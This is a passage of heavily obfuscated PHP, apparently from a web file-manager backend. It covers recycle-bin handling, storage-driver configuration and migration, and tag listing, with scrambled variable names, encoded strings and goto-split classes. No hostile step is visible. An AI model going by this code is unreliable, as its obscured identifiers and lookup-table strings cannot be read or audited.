$‘´•™‘) { if (isset($‘´•™‘[$»ƒŒ¡´×[1914]])) { $Ë´‘†çŒ[] = $‘´•™‘[$»ƒŒ¡´×[1914]][$»ƒŒ¡´×[1678]]; } } $æğàÓÃ = Model($»ƒŒ¡´×[534])->userListInfo($Ë´‘†çŒ); foreach ($é°İè° as &$‘´•™‘) { $‘´•™‘[$»ƒŒ¡´×[599]] = $æğàÓÃ[$‘´•™‘[$»ƒŒ¡´×[1678]]]; if (isset($‘´•™‘[$»ƒŒ¡´×[1914]])) { $‘´•™‘[$»ƒŒ¡´×[1914]][$»ƒŒ¡´×[599]] = $æğàÓÃ[$‘´•™‘[$»ƒŒ¡´×[1914]][$»ƒŒ¡´×[1678]]]; } } unset($‘´•™‘); } private function _listAppendMeta(&$ã—æ…¥) { $Ö¬×«¡À =& $_SERVER[ï»»·÷á]; $™’ë…ÍÔ = array_unique(array_to_keyvalue($ã—æ…¥, $Ö¬×«¡À[12], $Ö¬×«¡À[1904])); $™’ë…ÍÔ = array_remove_value($™’ë…ÍÔ, $Ö¬×«¡À[198]); if (!$™’ë…ÍÔ) { return; } foreach ($ã—æ…¥ as $ŸÑˆŸ×¶) { if (isset($ŸÑˆŸ×¶[$Ö¬×«¡À[1914]])) { $™’ë…ÍÔ[] = $ŸÑˆŸ×¶[$Ö¬×«¡À[1914]][$Ö¬×«¡À[1904]]; } } $˜³İ“¤± = $this->metaList($™’ë…ÍÔ); if (!$˜³İ“¤±) { return !1; } foreach ($ã—æ…¥ as &$ŸÑˆŸ×¶) { $ŸÑˆŸ×¶[$Ö¬×«¡À[475]] = $˜³İ“¤±[$ŸÑˆŸ×¶[$Ö¬×«¡À[1904]]]; if (isset($ŸÑˆŸ×¶[$Ö¬×«¡À[1914]])) { $ŸÑˆŸ×¶[$Ö¬×«¡À[1914]][$Ö¬×«¡À[475]] = $˜³İ“¤±[$ŸÑˆŸ×¶[$Ö¬×«¡À[1914]][$Ö¬×«¡À[1904]]]; } } unset($ŸÑˆŸ×¶); } private function metaList($»³³³ŒÛ) { $•³ÍÍ» =& $_SERVER[ï»»·÷á]; if (!$»³³³ŒÛ) { return array(); } $ò¢µ¤Ë˜ = array($•³ÍÍ»[1904] => array($•³ÍÍ»[7], $»³³³ŒÛ)); $òéŞ—’Ñ = Model($•³ÍÍ»[1915])->where($ò¢µ¤Ë˜)->select(); $òéŞ—’Ñ = array_to_keyvalue_group($òéŞ—’Ñ, $•³ÍÍ»[1904]); foreach ($òéŞ—’Ñ as $å¶¶º„§ => $ƒÒ€Äàº) { $ÖÖê×óø = array(); foreach ($ƒÒ€Äàº as $ïÄ¼Åİş) { $ÖÖê×óø[$ïÄ¼Åİş[$•³ÍÍ»[94]]] = $ïÄ¼Åİş[$•³ÍÍ»[374]]; } $òéŞ—’Ñ[$å¶¶º„§] = $ÖÖê×óø; } return $òéŞ—’Ñ ? $òéŞ—’Ñ : array(); } } goto Dœ‹òà£‚ò; d±”ì¼À‹¶: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\162\x63\145\x5f\162\145\x63\x79\143\154\x65"; protected $dataAuto = array(array("\x63\x72\145\x61\164\x65\x54\151\155\145", "\x74\x69\155\145", "\151\156\163\x65\162\164", "\x66\x75\156\143\164\x69\x6f\156")); public function listData($Öåñİ„ = false) { $“ºÙİş¦ =& $_SERVER[ï»»·÷á]; $Öåñİ„ = $Öåñİ„ ? $Öåñİ„ : USER_ID; $Š·ÁÀÚ = $this->where(array($“ºÙİş¦[1669] => $Öåñİ„))->select(); return array_to_keyvalue($Š·ÁÀÚ, $“ºÙİş¦[12], $“ºÙİş¦[411]); } public function moveToRecycle($˜ñ«˜ñÏ) { $£„ ÈÏ› =& $_SERVER[ï»»·÷á]; $¥“İó®Ã = Model($£„ ÈÏ›[1349]); $õÔÏïÛ® = $¥“İó®Ã->sourceInfo($˜ñ«˜ñÏ); if (!$õÔÏïÛ® || $õÔÏïÛ®[$£„ ÈÏ›[440]] == $£„ ÈÏ›[88]) { return; } $©Áû„€› = array($£„ ÈÏ›[426] => $˜ñ«˜ñÏ, $£„ ÈÏ›[1669] => USER_ID, $£„ ÈÏ›[585] => $õÔÏïÛ®[$£„ ÈÏ›[420]], $£„ ÈÏ›[586] => $õÔÏïÛ®[$£„ ÈÏ›[505]], $£„ ÈÏ›[589] => $õÔÏïÛ®[$£„ ÈÏ›[520]]); $this->add($©Áû„€›); $this->recycleMove($˜ñ«˜ñÏ, 1); if ($õÔÏïÛ®[$£„ ÈÏ›[419]] == $£„ ÈÏ›[88]) { $…ŸÇûÜç = array($£„ ÈÏ›[589] => array($£„ ÈÏ›[549], $õÔÏïÛ®[$£„ ÈÏ›[520]] . $˜ñ«˜ñÏ . $£„ ÈÏ›[550])); $¥“İó®Ã->where($…ŸÇûÜç)->setField($£„ ÈÏ›[440], 1); } } public function clear() { $this->remove(!1); } public function remove($¸òêÂÚœ = false, $šöåÌïğ = false) { $š˜²£ñş =& $_SERVER[ï»»·÷á]; $šöåÌïğ = $šöåÌïğ ? $šöåÌïğ : USER_ID; $…ôĞàÙ– = Model($š˜²£ñş[1349]); $ßç•í¬Ù = $this->listData($šöåÌïğ); $¸òêÂÚœ = $¸òêÂÚœ === !1 ? !1 : $¸òêÂÚœ; $µ²àÎÅÄ = array(); foreach ($ßç•í¬Ù as $‹‡¾İ‹Î) { if ($¸òêÂÚœ != !1 && !in_array($‹‡¾İ‹Î, $¸òêÂÚœ)) { continue; } $ãÂÎù¶Œ = $…ôĞàÙ–->sourceInfo($‹‡¾İ‹Î); $…ôĞàÙ–->remove($‹‡¾İ‹Î, !1); $¦ğöÖÔØ = $ãÂÎù¶Œ[$š˜²£ñş[420]] . $š˜²£ñş[11] . $ãÂÎù¶Œ[$š˜²£ñş[505]]; $µ²àÎÅÄ[$¦ğöÖÔØ] = array($š˜²£ñş[585] => $ãÂÎù¶Œ[$š˜²£ñş[420]], $š˜²£ñş[505] => $ãÂÎù¶Œ[$š˜²£ñş[505]]); $this->where(array($š˜²£ñş[411] => $‹‡¾İ‹Î))->delete(); } foreach ($µ²àÎÅÄ as $Œú¦ö÷Ë) { $…ôĞàÙ–->targetSpaceUpdate($Œú¦ö÷Ë[$š˜²£ñş[420]], $Œú¦ö÷Ë[$š˜²£ñş[505]]); } } public function restore($‘–´õÊ· = false) { $ï‚½ƒê = $this->listData(); $this->_restoreSource($ï‚½ƒê, $‘–´õÊ·); } public function removeUserAll($¥§²³º¥) { $this->remove(!1, $¥§²³º¥); } private function _restoreSource($‚‚Íğ·, $ËßÜé½) { $·ëÖ´Æ =& $_SERVER[ï»»·÷á]; $…ëÕ³“ = Model($·ëÖ´Æ[1349]); $ËßÜé½ = $ËßÜé½ == !1 ? !1 : $ËßÜé½; if (!$‚‚Íğ·) { return !0; } $±ÖÒÀ = array(); foreach ($‚‚Íğ· as $æ¦µ‹Ã) { if ($ËßÜé½ != !1 && !in_array($æ¦µ‹Ã, $ËßÜé½)) { continue; } $Óüõ¶´ã = $…ëÕ³“->sourceInfo($æ¦µ‹Ã); $ĞÅ€İ˜Ü = $…ëÕ³“->sourceInfo($Óüõ¶´ã[$·ëÖ´Æ[441]]); if ($ĞÅ€İ˜Ü[$·ëÖ´Æ[440]] == $·ëÖ´Æ[88]) { continue; } $…ëÕ³“->lockMoveStart($æ¦µ‹Ã); $this->recycleMove($æ¦µ‹Ã, 0); if ($Óüõ¶´ã[$·ëÖ´Æ[419]] == $·ëÖ´Æ[88]) { $ôÅ¿œÉÖ = array($·ëÖ´Æ[589] => array($·ëÖ´Æ[549], $Óüõ¶´ã[$·ëÖ´Æ[520]] . $æ¦µ‹Ã . $·ëÖ´Æ[550])); $…ëÕ³“->where($ôÅ¿œÉÖ)->setField($·ëÖ´Æ[440], 0); $this->restoreFolderChildren($æ¦µ‹Ã, $‚‚Íğ·); } $this->where(array($·ëÖ´Æ[411] => $æ¦µ‹Ã))->delete(); $…ëÕ³“->folderSizeReset($Óüõ¶´ã[$·ëÖ´Æ[441]]); $±ÖÒÀ[] = $Óüõ¶´ã[$·ëÖ´Æ[441]]; if ($Óüõ¶´ã[$·ëÖ´Æ[419]] == $·ëÖ´Æ[88]) { $±ÖÒÀ[] = $æ¦µ‹Ã; } $…ëÕ³“->lockMoveEnd($æ¦µ‹Ã); } $…ëÕ³“->updateModifyTime($±ÖÒÀ); } private function restoreFolderChildren($õõò˜ëç, $¬¦é¤ƒí) { $º¢‰Ã„Ù =& $_SERVER[ï»»·÷á]; $˜ë³“©“ = Model($º¢‰Ã„Ù[1349]); $ÁĞÆ…‰Á = array($º¢‰Ã„Ù[411] => array($º¢‰Ã„Ù[7], array())); foreach ($¬¦é¤ƒí as $ÁÄ–Ğš) { if ($ÁÄ–Ğš == $õõò˜ëç) { continue; } if (!$˜ë³“©“->isParentOf($õõò˜ëç, $ÁÄ–Ğš)) { continue; } $ó®ˆ•êÖ = $˜ë³“©“->sourceInfo($ÁÄ–Ğš); if ($ó®ˆ•êÖ[$º¢‰Ã„Ù[419]] == $º¢‰Ã„Ù[88]) { $ÁĞÆ…‰Á[] = array($º¢‰Ã„Ù[589] => array($º¢‰Ã„Ù[549], $ó®ˆ•êÖ[$º¢‰Ã„Ù[520]] . $ÁÄ–Ğš . $º¢‰Ã„Ù[550])); } else { $ÁĞÆ…‰Á[$º¢‰Ã„Ù[411]][1][] = $ÁÄ–Ğš; } } if (!$ÁĞÆ…‰Á[$º¢‰Ã„Ù[411]][1]) { unset($ÁĞÆ…‰Á[$º¢‰Ã„Ù[411]]); } if (!$ÁĞÆ…‰Á) { return; } $ÁĞÆ…‰Á[$º¢‰Ã„Ù[411]][1] = array_unique($ÁĞÆ…‰Á[$º¢‰Ã„Ù[411]][1]); $ÁĞÆ…‰Á[$º¢‰Ã„Ù[1010]] = $º¢‰Ã„Ù[1965]; $˜ë³“©“->where($ÁĞÆ…‰Á)->setField($º¢‰Ã„Ù[440], 1); } private function recycleMove($ÉôìÃæË, $íı™¢³“ = 1) { $€âªú“Ù =& $_SERVER[ï»»·÷á]; $§²Ÿ„®¤ = Model($€âªú“Ù[1349]); $ Û¾Õ÷Ô = Model($€âªú“Ù[2181]); $áñ’Ú¦ó = array($€âªú“Ù[411] => $ÉôìÃæË); if ($íı™¢³“) { $§²Ÿ„®¤->where($áñ’Ú¦ó)->setField($€âªú“Ù[440], 1); $ Û¾Õ÷Ô->eventRecycle($ÉôìÃæË, $€âªú“Ù[2182]); } else { $·Õ¸Ö‚ = $§²Ÿ„®¤->where($áñ’Ú¦ó)->find(); $¶Ñâ®Û‚ = $·Õ¸Ö‚[$€âªú“Ù[419]] == $€âªú“Ù[88]; $²¨°€€å = $§²Ÿ„®¤->fileNameAuto($·Õ¸Ö‚[$€âªú“Ù[441]], $·Õ¸Ö‚[$€âªú“Ù[32]], REPEAT_RENAME_FOLDER, $¶Ñâ®Û‚); if ($²¨°€€å != $·Õ¸Ö‚[$€âªú“Ù[32]]) { $§²Ÿ„®¤->rename($ÉôìÃæË, $²¨°€€å); } $§²Ÿ„®¤->where($áñ’Ú¦ó)->setField($€âªú“Ù[440], 0); $ Û¾Õ÷Ô->eventRecycle($ÉôìÃæË, $€âªú“Ù[2183]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\163\157\x75\162\143\x65\123\145\143\162\x65\164\x4c\151\163\x74"; public $field = array("\163\x6f\165\x72\143\x65\x49\x44", "\164\171\160\x65\x49\104", "\x63\162\145\141\x74\145\125\163\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\x2e\163\164\157\162\x61\147\x65\114\151\163\x74"; public $field = array("\156\x61\155\145", "\163\151\x7a\x65\115\141\170", "\163\x79\163\164\145\x6d", "\x64\145\146\141\x75\154\164", "\144\162\x69\x76\x65\x72", "\x63\157\x6e\146\x69\147"); public function listData($Ú•Œ”«œ = false, $ÎÓ…ÙšË = "\155\157\x64\x69\146\x79\x54\x69\x6d\x65", $‡â—ÔÇ‘ = false) { $§ÍŸ”ªñ =& $_SERVER[ï»»·÷á]; $ÄÀ¼ªøş = parent::listData($Ú•Œ”«œ, $ÎÓ…ÙšË, $‡â—ÔÇ‘); if ($Ú•Œ”«œ) { return $ÄÀ¼ªøş; } $¯Ãó¨ø» = $this->ioSizeUseGet(array_to_keyvalue($ÄÀ¼ªøş, $§ÍŸ”ªñ[12], $§ÍŸ”ªñ[399])); foreach ($ÄÀ¼ªøş as $Ú™å«Íô => $ÑµƒÀ–) { unset($ÄÀ¼ªøş[$Ú™å«Íô][$§ÍŸ”ªñ[6]]); $ÄÀ¼ªøş[$Ú™å«Íô][$§ÍŸ”ªñ[1856]] = isset($¯Ãó¨ø»[$ÑµƒÀ–[$§ÍŸ”ªñ[399]]]) ? $¯Ãó¨ø»[$ÑµƒÀ–[$§ÍŸ”ªñ[399]]] : 0; } return $ÄÀ¼ªøş; } public function ioSizeUseGet($ÒªÁı›“) { $Û‚Í€ =& $_SERVER[ï»»·÷á]; if (!$ÒªÁı›“) { return array(); } $½’Õ±»ê = $Û‚Í€[2184] . implode($Û‚Í€[50], $ÒªÁı›“); $‰ÓùÍğ’ = Cache::get($½’Õ±»ê); if ($‰ÓùÍğ’) { return $‰ÓùÍğ’; } $¢ùü×ÇÎ = array($Û‚Í€[830] => $Û‚Í€[399], $Û‚Í€[2185] => $Û‚Í€[76]); $å¨˜ƒ¬– = array($Û‚Í€[830] => array($Û‚Í€[7], $ÒªÁı›“)); $‰ÓùÍğ’ = Model($Û‚Í€[802])->field($¢ùü×ÇÎ)->where($å¨˜ƒ¬–)->group($Û‚Í€[830])->select(); $‰ÓùÍğ’ = array_to_keyvalue($‰ÓùÍğ’, $Û‚Í€[399], $Û‚Í€[76]); Cache::set($½’Õ±»ê, $‰ÓùÍğ’, 600); return $‰ÓùÍğ’; } public function getConfig($ÄÑùğŠ) { $ø¨ãÃßÏ = parent::listData($ÄÑùğŠ); return json_decode($ø¨ãÃßÏ[$_SERVER[ï»»·÷á][6]], !0); } public function update($‰˜Ùî„Ê, $‚é‰·Î‡) { $ÀŠàĞÄú =& $_SERVER[ï»»·÷á]; $„÷Îª¦’ = $‚é‰·Î‡[$ÀŠàĞÄú[32]]; $ÀøÊãÛ = array_to_keyvalue(parent::listData(), $ÀŠàĞÄú[32]); if (isset($ÀøÊãÛ[$„÷Îª¦’]) && $ÀøÊãÛ[$„÷Îª¦’][$ÀŠàĞÄú[399]] != $‰˜Ùî„Ê) { return !1; } $this->checkPwd($‰˜Ùî„Ê, $‚é‰·Î‡); if (isset($‚é‰·Î‡[$ÀŠàĞÄú[2186]]) && $‚é‰·Î‡[$ÀŠàĞÄú[2186]] == $ÀŠàĞÄú[88]) { $this->checkConfig($‚é‰·Î‡); } unset($‚é‰·Î‡[$ÀŠàĞÄú[2186]]); $íÅ­ìåÈ = parent::update($‰˜Ùî„Ê, $‚é‰·Î‡); if ($íÅ­ìåÈ && $‚é‰·Î‡[$ÀŠàĞÄú[37]]) { $»õŒÈçš = 0; foreach ($ÀøÊãÛ as $úÌ Ê«) { if ($úÌ Ê«[$ÀŠàĞÄú[37]] && $úÌ Ê«[$ÀŠàĞÄú[399]] != $‰˜Ùî„Ê) { $»õŒÈçš = $úÌ Ê«[$ÀŠàĞÄú[399]]; parent::update($úÌ Ê«[$ÀŠàĞÄú[399]], array($ÀŠàĞÄú[37] => 0)); } } $this->updateBackup($‰˜Ùî„Ê, $»õŒÈçš); } return $íÅ­ìåÈ; } public function add($¿²¯ˆ) { $¥Üöš¬» =& $_SERVER[ï»»·÷á]; $µÂßÑ§ã = array_to_keyvalue(parent::listData(), $¥Üöš¬»[32]); if (isset($µÂßÑ§ã[$¿²¯ˆ[$¥Üöš¬»[32]]])) { return !1; } $this->checkConfig($¿²¯ˆ); $€¸ÑêŞ† = parent::insert($¿²¯ˆ); if ($€¸ÑêŞ† && $¿²¯ˆ[$¥Üöš¬»[37]]) { foreach ($µÂßÑ§ã as $úåüÁî‰) { if ($úåüÁî‰[$¥Üöš¬»[37]]) { parent::update($úåüÁî‰[$¥Üöš¬»[399]], array($¥Üöš¬»[37] => 0)); } } } return $€¸ÑêŞ†; } public function updateBackup($­Ü¨Â, $™£€İğ¾) { $å¥Ù‹üş =& $_SERVER[ï»»·÷á]; if (!$™£€İğ¾) { return; } $¨ş›ªæ¢ = Model($å¥Ù‹üş[761])->config(); if ($¨ş›ªæ¢[$å¥Ù‹üş[1648]] != $å¥Ù‹üş[88] || $¨ş›ªæ¢[$å¥Ù‹üş[764]] != $™£€İğ¾) { return; } $ú½ßâİ± = Model($å¥Ù‹üş[783])->get($å¥Ù‹üş[793]); $ú½ßâİ± = json_decode($ú½ßâİ±, !0); if (!$ú½ßâİ±) { return; } $ú½ßâİ±[$å¥Ù‹üş[764]] = $­Ü¨Â; Model($å¥Ù‹üş[783])->set(array($å¥Ù‹üş[793] => $ú½ßâİ±)); } public function checkPwd($§ƒˆˆ«, &$íÙÁøªë) { $‡¯òÊ€ =& $_SERVER[ï»»·÷á]; if (empty($íÙÁøªë[$‡¯òÊ€[6]])) { return; } $®°Ñå‘‰ = json_decode($íÙÁøªë[$‡¯òÊ€[6]], !0); $µÓÚÖÎ· = $‡¯òÊ€[12]; $©Æúí£é = array($‡¯òÊ€[2187], $‡¯òÊ€[2188], $‡¯òÊ€[899]); foreach ($©Æúí£é as $øªí©¥…) { if (isset($®°Ñå‘‰[$øªí©¥…])) { $µÓÚÖÎ· = $øªí©¥…; break; } } if (!$µÓÚÖÎ·) { return; } $¿º†ËüŸ = $this->getConfig($§ƒˆˆ«); $ØÕ³•Ã´ = $¿º†ËüŸ[$µÓÚÖÎ·]; $ğç¥ªá® = $®°Ñå‘‰[$µÓÚÖÎ·]; if ($ğç¥ªá® == str_repeat($‡¯òÊ€[189], strlen($ØÕ³•Ã´))) { $®°Ñå‘‰[$µÓÚÖÎ·] = $ØÕ³•Ã´; $íÙÁøªë[$‡¯òÊ€[6]] = json_encode($®°Ñå‘‰); } else { if ($ğç¥ªá® != $ØÕ³•Ã´) { $íÙÁøªë[$‡¯òÊ€[2186]] = $‡¯òÊ€[88]; } } } public function checkConfig(&$ì‹ˆÌ¡, $É½›Ñ€ö = false) { $âÎ˜åãç =& $_SERVER[ï»»·÷á]; $ˆ…öİ³Î = strtolower($ì‹ˆÌ¡[$âÎ˜åãç[95]]); $à™­Óàï = json_decode($ì‹ˆÌ¡[$âÎ˜åãç[6]], !0); foreach ($à™­Óàï as $–Îõù¦š => $íü²Ó‡Ã) { $à™­Óàï[$–Îõù¦š] = trim($íü²Ó‡Ã); } $à™­Óàï[$âÎ˜åãç[2189]] = rand_string(6); $¼§—‰Ü› = $GLOBALS[$âÎ˜åãç[6]][$âÎ˜åãç[89]][$âÎ˜åãç[839]]; $ş˜°–  = isset($¼§—‰Ü›[$ˆ…öİ³Î]) ? $¼§—‰Ü›[$ˆ…öİ³Î] : ucfirst($ˆ…öİ³Î); $Å§úæó = $âÎ˜åãç[74] . $ş˜°– ; if (!$ş˜°–  || !class_exists($Å§úæó)) { if ($É½›Ñ€ö) { return LNG($âÎ˜åãç[2190]); } write_log(array($âÎ˜åãç[2191], $ì‹ˆÌ¡, get_caller_info()), $âÎ˜åãç[2192]); show_json(LNG($âÎ˜åãç[2190]), !1, $ì‹ˆÌ¡); } $µ«âÃìê = new $Å§úæó($à™­Óàï); if (in_array($ˆ…öİ³Î, $µ«âÃìê->objectDriver)) { if (!$µ«âÃìê->isBucketCors() && !$µ«âÃìê->setBucketCors()) { $ó°ëùÆÒ = LNG($âÎ˜åãç[2193]); $ó°ëùÆÒ .= $âÎ˜åãç[2194] . LNG($âÎ˜åãç[2195]); if ($É½›Ñ€ö) { return $ó°ëùÆÒ; } show_json($ó°ëùÆÒ, !1); } } $…ËÕÊÑò = rtrim($à™­Óàï[$âÎ˜åãç[1190]], $âÎ˜åãç[8]) . $âÎ˜åãç[8]; $¨¹Œè—› = $µ«âÃìê->getPath($…ËÕÊÑò . $âÎ˜åãç[1194]); if (!$µ«âÃìê->mkfile($¨¹Œè—›)) { if ($É½›Ñ€ö) { return LNG($âÎ˜åãç[2193]); } show_json(LNG($âÎ˜åãç[2193]), !1); } $à™­Óàï[$âÎ˜åãç[1190]] = $…ËÕÊÑò; $ì‹ˆÌ¡[$âÎ˜åãç[6]] = json_encode($à™­Óàï); $ì‹ˆÌ¡[$âÎ˜åãç[95]] = $ş˜°– ; return !0; } public function driverListSystem() { $ë®Òé€… =& $_SERVER[ï»»·÷á]; $…’Ô©ïÅ = parent::listData(); $ĞÛÚğß© = array(); foreach ($…’Ô©ïÅ as $üîõÔ¸) { unset($üîõÔ¸[$ë®Òé€…[201]], $üîõÔ¸[$ë®Òé€…[85]]); $üîõÔ¸[$ë®Òé€…[6]] = json_decode($üîõÔ¸[$ë®Òé€…[6]], !0); $ĞÛÚğß©[] = $üîõÔ¸; } return $ĞÛÚğß©; } public function defaultDriver() { $Šœüã±ù =& $_SERVER[ï»»·÷á]; $´¦ßãÎ« = parent::listData(); $ªñ¿ËŞ— = array_filter_by_field($´¦ßãÎ«, $Šœüã±ù[37], 1); $ªñ¿ËŞ— = $ªñ¿ËŞ—[0]; if ($ªñ¿ËŞ—) { $ªñ¿ËŞ—[$Šœüã±ù[6]] = json_decode($ªñ¿ËŞ—[$Šœüã±ù[6]], !0); } return $ªñ¿ËŞ—; } public function driverInfo($¾ñŞÔÒ“) { $äé³Ê„¸ =& $_SERVER[ï»»·÷á]; $±Ãéµî = array_to_keyvalue(parent::listData(), $äé³Ê„¸[399]); if (!isset($±Ãéµî[$¾ñŞÔÒ“])) { return !1; } $’†îÂİĞ = $±Ãéµî[$¾ñŞÔÒ“]; $’†îÂİĞ[$äé³Ê„¸[6]] = json_decode($’†îÂİĞ[$äé³Ê„¸[6]], !0); return $’†îÂİĞ; } public function remove($ç¿É«Æ†) { $this->removeShareItems($ç¿É«Æ†); return parent::remove($ç¿É«Æ†); } public function removeWithFile($ÜƒûŠ†ü, $¿¼£ìÛõ) { $ªÃ¤­ø =& $_SERVER[ï»»·÷á]; $Ñ¶æƒ·º = array($ªÃ¤­ø[830] => $ÜƒûŠ†ü); $ò”¢í¡ = Model($ªÃ¤­ø[480])->where($Ñ¶æƒ·º)->count(); $œõ©É¼¡ = Model($ªÃ¤­ø[480])->where($Ñ¶æƒ·º)->sum($ªÃ¤­ø[76]); $˜¢â†çµ = $¿¼£ìÛõ . $ªÃ¤­ø[2196] . $ÜƒûŠ†ü; $œÒŠÑÌ¦ = LNG($¿¼£ìÛõ == $ªÃ¤­ø[557] ? $ªÃ¤­ø[2197] : $ªÃ¤­ø[2198]); $®¯™—»ç = new TaskFileTransfer($˜¢â†çµ, $ªÃ¤­ø[2192], $ò”¢í¡, $œÒŠÑÌ¦ . "\50{$ÜƒûŠ†ü}\x29"); $®¯™—»ç->task[$ªÃ¤­ø[776]] = (double) $œõ©É¼¡; $ºÏß™¢Ë = KodIO::defaultDriver(); $®¢äöÏ = $ºÏß™¢Ë[$ªÃ¤­ø[399]]; $×±š¡¬¹ = "\173\151\157\72{$®¢äöÏ}\x7d\x2f"; $º½ÚÃÍû = !0; $©Œß©ä = array(); $ŒãÓ‰ï€ = Model($ªÃ¤­ø[200])->where($Ñ¶æƒ·º)->field($ªÃ¤­ø[2199])->select(); foreach ($ŒãÓ‰ï€ as $ëŸëÅãƒ) { $ğ¦ÀÔóí = $ëŸëÅãƒ[$ªÃ¤­ø[84]]; $á–’…ùØ = $×±š¡¬¹ . str_replace("\x7b\x69\157\x3a{$ÜƒûŠ†ü}\175\x2f", $ªÃ¤­ø[12], $ğ¦ÀÔóí); if (!IO::exist($ğ¦ÀÔóí)) { $©Œß©ä[] = $ëŸëÅãƒ[$ªÃ¤­ø[477]]; $®¯™—»ç->updateFileEnd($ëŸëÅãƒ[$ªÃ¤­ø[32]], $ëŸëÅãƒ[$ªÃ¤­ø[76]]); continue; } if (IO::exist($á–’…ùØ)) { $®¯™—»ç->updateFileEnd($ëŸëÅãƒ[$ªÃ¤­ø[32]], $ëŸëÅãƒ[$ªÃ¤­ø[76]]); continue; } if (!IO::move($ğ¦ÀÔóí, get_path_father($á–’…ùØ))) { $º½ÚÃÍû = !1; break; } $Ñ¶æƒ·º = array($ªÃ¤­ø[477] => $ëŸëÅãƒ[$ªÃ¤­ø[477]]); $€¨èêØÚ = array($ªÃ¤­ø[830] => $®¢äöÏ, $ªÃ¤­ø[84] => $á–’…ùØ); Model($ªÃ¤­ø[200])->where($Ñ¶æƒ·º)->save($€¨èêØÚ); } $this->removeByFileID($©Œß©ä); if (!$º½ÚÃÍû) { $®¯™—»ç->stop($˜¢â†çµ); return !1; } $®¯™—»ç->end(); if ($¿¼£ìÛõ == $ªÃ¤­ø[1836]) { $this->remove($ÜƒûŠ†ü); } } public function progress($¢Á„Î…, $ åèçéñ) { return Task::get($ åèçéñ . $_SERVER[ï»»·÷á][2196] . $¢Á„Î…); } private function removeByFileID($®‡Õ²Ç = array()) { $Ø¢¸÷¼€ =& $_SERVER[ï»»·÷á]; if (empty($®‡Õ²Ç)) { return; } $êØ¸¡ÜÖ = array($Ø¢¸÷¼€[477] => array($Ø¢¸÷¼€[7], $®‡Õ²Ç)); $ùâæ’ = Model($Ø¢¸÷¼€[1349])->where($êØ¸¡ÜÖ)->field($Ø¢¸÷¼€[411])->select(); if (!$ùâæ’) { return; } $ùâæ’ = array_to_keyvalue($ùâæ’, $Ø¢¸÷¼€[12], $Ø¢¸÷¼€[411]); foreach ($ùâæ’ as $û‰•‰Ì) { Model($Ø¢¸÷¼€[425])->removeNow($û‰•‰Ì, !1); } } private function removeShareItems($Š‰šüàğ) { $…éÛ¶ş =& $_SERVER[ï»»·÷á]; $·ÙÌŠÕ = "\173\151\157\72{$Š‰šüàğ}\175\57"; $Ö©ÀŒü× = array($…éÛ¶ş[411] => 0, $…éÛ¶ş[1185] => array($…éÛ¶ş[383], "{$·ÙÌŠÕ}\45")); $Ÿ¸ÇÛ°ô = Model($…éÛ¶ş[1847])->where($Ö©ÀŒü×)->field($…éÛ¶ş[602])->select(); if (empty($Ÿ¸ÇÛ°ô)) { return; } $¶åÍçà = array_to_keyvalue($Ÿ¸ÇÛ°ô, $…éÛ¶ş[12], $…éÛ¶ş[602]); Model($…éÛ¶ş[601])->remove($¶åÍçà); } } goto FÈÕ·¼Øõê; bÍÔÔ ’Ğ§: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\137\x66\x61\166"; protected function cacheFunctionAlias($üûËØÚ») { $‹ÂĞÙûÂ =& $_SERVER[ï»»·÷á]; return array($‹ÂĞÙûÂ[1976] => array($üûËØÚ»[0], $‹ÂĞÙûÂ[1977]), $‹ÂĞÙûÂ[1978] => array($üûËØÚ»[0], $‹ÂĞÙûÂ[1979])); } protected function get($Ã§ºÌùà) { $¿”Í«Ùú =& $_SERVER[ï»»·÷á]; $¼•âã±Ú = Model($¿”Í«Ùú[521])->metaGet($Ã§ºÌùà, $¿”Í«Ùú[1980]); $×¶ş¾—à = json_decode($¼•âã±Ú, !0); return $×¶ş¾—à ? $×¶ş¾—à : array($¿”Í«Ùú[1981] => $¿”Í«Ùú[88], $¿”Í«Ùú[369] => array()); } protected function set($Ã©ÑÚœ, $ç©äÜÔø) { $ÕœÚÙÛ =& $_SERVER[ï»»·÷á]; $ç©äÜÔø = $ç©äÜÔø ? $ç©äÜÔø : array($ÕœÚÙÛ[1981] => $ÕœÚÙÛ[88], $ÕœÚÙÛ[369] => array()); return Model($ÕœÚÙÛ[521])->metaSet($Ã©ÑÚœ, $ÕœÚÙÛ[1980], json_encode($ç©äÜÔø)); } protected function getByTagID($¡çÈ“Ç£, $Ãİü¯Ü¸) { $””Ğ×©˜ =& $_SERVER[ï»»·÷á]; if (!$¡çÈ“Ç£ || !$Ãİü¯Ü¸) { return !1; } if (!Model($””Ğ×©˜[521])->getInfoSimple($¡çÈ“Ç£)) { return !1; } $ÚÓ¹ıĞ = $this->get($¡çÈ“Ç£); if (!$ÚÓ¹ıĞ || !isset($ÚÓ¹ıĞ[$””Ğ×©˜[369]])) { return !1; } $ö¢¢óıÀ = array_find_by_field($ÚÓ¹ıĞ[$””Ğ×©˜[369]], $””Ğ×©˜[399], $Ãİü¯Ü¸); return is_array($ö¢¢óıÀ) ? $ö¢¢óıÀ : !1; } public function listSource($ú¦¸úË€, $âª ¯¥¡) { $­¦Û¹œÆ =& $_SERVER[ï»»·÷á]; if ($âª ¯¥¡ && !is_array($âª ¯¥¡)) { $âª ¯¥¡ = array($âª ¯¥¡); } $Ì¥´§×” = $this->listData($ú¦¸úË€); $Šı£üñŸ = array(); foreach ($Ì¥´§×” as $ó’”ïÅ³) { $ÄÂ¤§É¾ = $ó’”ïÅ³[$­¦Û¹œÆ[84]]; if (!$ÄÂ¤§É¾) { continue; } if (!isset($Šı£üñŸ[$ÄÂ¤§É¾])) { $Šı£üñŸ[$ÄÂ¤§É¾] = array(); } $Šı£üñŸ[$ÄÂ¤§É¾][] = $ó’”ïÅ³[$­¦Û¹œÆ[435]]; } $‹‹éÚ¼¥ = array(); foreach ($Šı£üñŸ as $°ÍÃ ›¾ => $œÖ¸®¬¬) { $²°ÌÊ¾» = !0; if (!$âª ¯¥¡) { $‹‹éÚ¼¥[] = $°ÍÃ ›¾; continue; } foreach ($âª ¯¥¡ as $êŒ£”¼) { if (!in_array($êŒ£”¼, $œÖ¸®¬¬)) { $²°ÌÊ¾» = !1; break; } } if ($²°ÌÊ¾») { $‹‹éÚ¼¥[] = $°ÍÃ ›¾; } } if (!$‹‹éÚ¼¥) { return array(); } 